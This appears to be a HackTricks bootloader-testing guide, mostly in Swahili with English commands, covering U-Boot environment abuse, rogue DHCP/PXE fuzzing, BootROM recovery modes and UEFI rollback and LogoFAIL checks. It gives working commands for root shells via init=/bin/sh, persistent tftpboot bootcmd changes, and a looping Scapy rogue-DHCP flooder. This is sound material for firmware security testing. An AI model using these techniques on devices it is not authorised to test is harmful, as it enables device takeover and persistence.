# Bootloader Testing

{{#include ../../banners/hacktricks-training.md}}

Hatua zifuatazo zinapendekezwa kwa kubadilisha usanidi wa kuanzisha kifaa na kujaribu bootloaders kama U-Boot na UEFI-class loaders. Lenga kupata early code execution, kutathmini ulinzi wa signature/rollback, na kuibiwa/kunyanyaswa kwa recovery au network-boot paths.

## U-Boot quick wins and environment abuse

1. Access the interpreter shell
- Wakati wa boot, bonyeza kifunguo kinachojulikana cha kuvunja (mara nyingi ni kifunguo chochote, 0, space, au mfululizo wa "magic" maalum kwa board) kabla ya `bootcmd` ikiendesha ili kupoteza hadi kwenye prompt ya U-Boot.

2. Inspect boot state and variables
- Amri zenye matumizi:
- `printenv` (dump environment)
- `bdinfo` (board info, memory addresses)
- `help bootm; help booti; help bootz` (supported kernel boot methods)
- `help ext4load; help fatload; help tftpboot` (available loaders)

3. Modify boot arguments to get a root shell
- Ongeza `init=/bin/sh` ili kernel iruke hadi shell badala ya init ya kawaida:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot from your TFTP server
- Sanidi mtandao na pakua kernel/fit image kutoka LAN:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Persist changes via environment
- Ikiwa storage ya env haijaweka kama write-protected, unaweza kuhifadhi udhibiti:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Angalia variables kama `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` ambazo zinaathiri fallback paths. Thamani zisizofaa zinaweza kuruhusu kuvuruga mara kwa mara ili kupata shell.

6. Check debug/unsafe features
- Angalia: `bootdelay` > 0, `autoboot` imezimwa, `usb start; fatload usb 0:1 ...` bila vikwazo, uwezo wa `loady`/`loads` kupitia serial, `env import` kutoka kwa media isiyo imara, na kernels/ramdisks zinazopakiwa bila checks za signature.

7. U-Boot image/verification testing
- Ikiwa platform inaudai secure/verified boot na FIT images, jaribu both unsigned na tampered images:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- Ukosefu wa `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` au tabia ya legacy `verify=n` mara nyingi huruhusu boot ya payload yoyote.

## Network-boot surface (DHCP/PXE) and rogue servers

8. PXE/DHCP parameter fuzzing
- U-Boot’s legacy BOOTP/DHCP handling imekuwa na masuala ya memory-safety. Kwa mfano, CVE‑2024‑42040 inaelezea memory disclosure kupitia crafted DHCP responses ambazo zinaweza leak bytes kutoka kwenye kumbukumbu ya U-Boot kurudishwa kwenye wire. Fanyia majaribio DHCP/PXE code paths na values zenye urefu kupita kiasi/edge-case (option 67 bootfile-name, vendor options, file/servername fields) na angalia kwa hangs/leaks.
- Minimal Scapy snippet ku- stress boot parameters wakati wa netboot:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Pia hakiki kama PXE filename fields zinapitishwa kwa shell/loader logic bila sanitization wakati zinachained na OS-side provisioning scripts.

9. Rogue DHCP server command injection testing
- Sanidi rogue DHCP/PXE service na jaribu kuingiza characters kwenye filename au options fields ili kufikia command interpreters katika hatua za baadaye za boot chain. Metasploit’s DHCP auxiliary, `dnsmasq`, au custom Scapy scripts zinafanya kazi vizuri. Hakikisha umeweka lab network izolieti kwanza.

## SoC ROM recovery modes that override normal boot

Mara nyingi SoCs zinaonyesha BootROM "loader" mode ambayo itakubali code kupitia USB/UART hata kama flash images si sahihi. Ikiwa secure-boot fuses hazijachomwa (blown), hili linaweza kutoa arbitrary code execution mapema sana katika chain.

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) or `imx-usb-loader`.
- Mfano: `imx-usb-loader u-boot.imx` ku-push na kuendesha custom U-Boot kutoka RAM.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Mfano: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` au `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Mfano: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` ili ku-stage loader na upload custom U-Boot.

Tambua kama kifaa kina secure-boot eFuses/OTP zilizochomwa. Ikiwa sivyo, BootROM download modes mara nyingi hupita juu ya verification ya higher-level (U-Boot, kernel, rootfs) kwa kuendesha first-stage payload yako moja kwa moja kutoka SRAM/DRAM.

## UEFI/PC-class bootloaders: quick checks

10. ESP tampering and rollback testing
- Mount EFI System Partition (ESP) na angalia components za loader: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor logo paths.
- Jaribu boot na downgraded au known-vulnerable signed boot components ikiwa Secure Boot revocations (dbx) hazija sasishwa. Ikiwa platform bado inamtumaini shims/bootmanagers za zamani, mara nyingi unaweza load kernel yako mwenyewe au `grub.cfg` kutoka ESP ili kupata persistence.

11. Boot logo parsing bugs (LogoFAIL class)
- OEM/IBV firmwares kadhaa zilikuwa na uharibifu wa image-parsing ndani ya DXE zinazoshughulikia boot logos. Ikiwa mwizi anaweza kuweka crafted image kwenye ESP chini ya vendor-specific path (mfano, `\EFI\<vendor>\logo\*.bmp`) na kufanya reboot, code execution wakati wa early boot inaweza kuwa inawezekana hata ikiwa Secure Boot imewezeshwa. Jaribu kama platform inakubali logos zinazotolewa na mtumiaji na kama paths hizo zinaweza kuandikwa kutoka OS.

## Hardware caution

Angalia kwa makini unapoingiliana na SPI/NAND flash wakati wa early boot (mfano, grounding pins ili bypass reads) na kila mara wasiliana na datasheet ya flash. Shorts zisizopangwa vizuri zinaweza kuharibu kifaa au programmer.

## Notes and additional tips

- Jaribu `env export -t ${loadaddr}` na `env import -t ${loadaddr}` kuhamisha environment blobs kati ya RAM na storage; baadhi ya platforms zinaruhusu importing env kutoka removable media bila authentication.
- Kwa persistence kwenye systems za Linux zinazoboot kupitia `extlinux.conf`, kubadilisha line ya `APPEND` (kuingiza `init=/bin/sh` au `rd.break`) kwenye boot partition mara nyingi inatosha pale hakuna signature checks.
- Ikiwa userland inatoa `fw_printenv/fw_setenv`, hakiki kwamba `/etc/fw_env.config` inalingana na storage ya env halisi. Offsets zilizopangwa vibaya zinaweza kukuruhusu kusoma/kuandika MTD region isiyo sahihi.

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)

{{#include ../../banners/hacktricks-training.md}}
